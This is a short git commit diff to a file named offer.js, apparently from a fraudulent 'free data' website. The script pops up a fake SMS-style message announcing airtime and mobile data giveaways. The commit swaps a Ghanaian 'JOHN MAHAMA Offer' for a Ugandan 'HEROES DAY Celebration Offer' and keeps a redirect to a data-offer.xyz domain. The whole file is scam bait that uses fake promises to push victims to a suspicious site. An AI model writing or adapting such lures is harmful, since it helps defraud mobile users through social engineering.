89ab168f5e7a6e6fe8603ec1d40489cc891408a0
kenycruzk <kenycruzk@gmail.com>
2025-06-06 05:35:14 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
+var password = '25GB + UGX10,000'
+password=prompt('SMS: Congratulations You are Eligible to receive UGX10,000 Airtime and 25GB Data HEROES DAY Celebration Offer, Kindly Press OK to ACTIVATE  ','25GB + UGX10,000');
+if (password != '25GB + UGX10,000') {
 location.href='https://mahama.data-offer.xyz/15GB';
 }
